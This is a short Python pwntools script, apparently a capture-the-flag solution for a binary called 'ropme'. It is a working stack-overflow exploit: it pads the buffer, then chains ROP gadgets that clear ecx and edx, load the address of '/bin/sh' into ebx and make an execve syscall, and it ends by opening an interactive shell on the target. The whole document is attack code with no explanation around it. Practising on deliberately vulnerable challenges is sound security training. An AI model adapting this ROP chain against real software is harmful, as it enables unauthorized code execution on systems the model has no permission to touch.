from pwn import *
from lib import *

context.log_level = 'ERROR'
p, elf = start('./ropme', args)

'''
    pop ebx
    xor edx, edx
    xor ecx, ecx
    mov ebx, esp
    mov eax, 0xb
    int 0x80
'''

payload = b'A' * 0x14
payload += p32(0x080484b5) # ecx = 0
payload += p32(0x080484b8) # edx = 0
payload += p32(0x0804832d) # pop ebx
payload += p32(0x0804a024) # &/bin/sh
payload += p32(0x080484bb) # eax && int

# 0x080484bb : mov eax, 0xb ; int 0x80
# 0x080484b5 : xor ecx, ecx ; ret
# 0x080484b8 : xor edx, edx ; ret

p.sendlineafter(b'It\'s time to ROP!\n', payload)
p.interactive()
p.close()
